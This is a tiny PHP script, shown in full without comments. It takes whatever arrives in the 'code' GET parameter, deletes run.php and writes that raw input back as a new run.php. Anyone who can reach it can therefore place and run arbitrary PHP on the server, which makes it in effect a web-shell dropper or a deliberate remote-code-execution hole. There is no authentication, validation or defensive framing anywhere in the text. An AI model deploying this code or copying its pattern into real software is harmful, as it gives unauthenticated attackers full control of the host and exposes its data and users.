<?php
    $content = $_GET['code'];
    unlink('run.php');
    $fp = fopen("run.php","w+");
    fwrite($fp,$content);
    fclose($fp);